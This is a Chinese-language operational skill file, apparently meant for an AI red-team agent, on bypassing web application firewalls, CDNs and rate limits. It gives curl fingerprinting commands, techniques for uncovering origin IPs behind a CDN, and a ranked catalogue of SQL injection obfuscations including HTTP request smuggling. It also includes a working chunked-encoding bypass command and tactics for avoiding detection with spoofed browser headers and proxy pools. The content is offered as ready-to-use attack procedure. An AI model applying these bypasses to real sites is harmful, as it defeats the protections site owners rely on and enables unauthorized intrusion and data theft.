---
name: waf-bypass
description: WAF / CDN / 限速绕过：先定指纹再选绕过法，含分块、参数污染、编码与出网伪装
whenToUse: 载荷被拦（403/406/JS 挑战/连接重置）或目标在 CDN 后面时
role: exploit
enabled: true
---

# WAF / CDN / 限速绕过与找源站

## 第一步：确认拦你的是谁

```bash
curl -sk -D- -o /dev/null 'http://TARGET/?id=%27%20AND%201=1--%20-' | grep -iE 'server|waf|cdn|cf-ray|x-powered|set-cookie'
```

| 特征 | 判定 | 打法方向 |
| --- | --- | --- |
| `cf-ray` / `CF-RAY`、`__cf_bm` | Cloudflare | 找**源站 IP**，别在 CDN 前绕 |
| `x-sumo-session`、403 带 `Reference` | AWS WAF | 编码 / 分块 / 慢速 |
| `Server: BigIP`、403 带 `Request Rejected` | F5 / 常见国产 WAF | 大小写、注释符、HPP |
| 返回 5 秒 JS 挑战页 | 行为检测 | 上真实浏览器（技能 `browser-automation`） |
| `429` + `Retry-After` | 限速，不是 WAF | 降速 + 代理池（技能 `cn-proxy-pool`） |

## 找源站（CDN 后面绕 WAF 的正解）

```text
① 历史 DNS：passive-recon 里的 pastdns / SecurityTrails
② 证书 SAN：openssl s_client -connect IP:443 看是否直连给真证书
③ 邮件头：Received 链里的发信 IP
④ 非 CDN 覆盖的入口：/api、websocket、非常规端口（8080/8443/9000）
⑤ 全球 ping / DNS 解析多点结果不一致 → 只有一个点是源
⑥ 用源站 IP + Host 头直连，返回和 CDN 前一致 = 命中
```

```bash
curl -sk --resolve TARGET:443:<候选IP> https://TARGET/ -o /dev/null -w '%{http_code} %{size_download}\n'
```

## 载荷层绕过（按成本从低到高）

```text
1 大小写      SeLeCt、UnIoN、oR、AnD
2 注释符      /**/、/*!50000And*/、--+、#、;
3 空白替代    %09 %0a %0b %0c %a0、/**/、(1)
4 双重编码    %2527、%253cscript%253e
5 Unicode 同形 全角 ＇、U+FF07；规范化绕过
6 分隔符变形  ' || '1 代替 ' OR '1、&& 代替 AND
7 等价函数    MID 代替 SUBSTR、ASCII 代替 ORD、IF 代替 CASE
8 结构改写    UNION ALL SELECT、子查询代替 JOIN、布尔改延时
9 传输层      Transfer-Encoding: chunked 拆 payload 到两个 chunk
             Content-Length 与 chunked 并存（CL.TE / TE.CL）
10 参数污染   id=1&id=2'、id[]=1、;jsessionid=x 前置、重复 key 取后者/前者
11 方法变形   POST body 传参、X-HTTP-Method-Override、pipeline 请求走私
```

**分块实测样例**（把 `union` 拆到两个 chunk，特征匹配就断了）：

```bash
printf 'POST /?id=1 HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nun\r\n4\r\nion\r\n0\r\n\r\n' | \
  openssl s_client -connect TARGET:443 -quiet 2>/dev/null | head -20
```

## 会话与指纹层

```text
UA        换真实浏览器 UA，别用 sqlmap 默认（--random-agent）
Header    补 Accept / Accept-Language / Referer，缺了像机器人
Cookie    先 GET 首页拿 Cookie 再打（很多 WAF 校验会话）
节奏      0.5–2s 抖动，单线程起步；命中封 IP 就换代理
TLS       curl 的 JA3 与浏览器不同，被 JS 挑战时改用真浏览器
```

## 被封之后的三条退路

1. **降速 + 单点**：`--threads=1 --delay=2`，先保命中不被封，别追全量。
2. **换出口**：代理池（技能 `cn-proxy-pool`）——**注意：代理只换你的 IP，不换目标的 WAF 规则**；先确认代理真的生效（`curl -x` 后看回显出口 IP）。
3. **换路径**：同一功能常有多个入口（`/api/v1` 与 `/api/v2`、`GET` 与 `POST`、`/search` 与 `/search/export`），老接口常常没进 WAF 规则。

## 失败分支

- **403 但内容其实执行了**（有些 WAF 只改状态码）→ 比对 `size_download` 与延时，别只看状态码。
- **连接直接 RESET** → 特征命中在 URL/UA 层，先换 UA 和路径长度，再谈 payload。
- **返回 HTML 里带 WAF 页特征但状态 200** → 用 `grep -c 'waf|blocked|请求已被拦截'` 做二次判定。
- **绕过成功但 sqlmap 反复报错** → 手工确认哪一条 payload 过，把那条塞进 `--prefix/--suffix` 或 `--eval`，别让它自己试。

## 落库要求

- 记 **WAF 指纹**（厂商 + 判定依据 header）到资产 `surface` / `note`。
- 每个成功绕过存**原始请求全文** + 被拦版本，形成对照证据。
- 找到源站 IP 必须单独 `redteam_asset_add`（`provenance=active`，`note` 写"源站，CDN 前绕过用"）——这是后续所有打点的入口。
- `redteam_chain_add`：`stage_code=exploit`，`tool` 写实际命令原文。
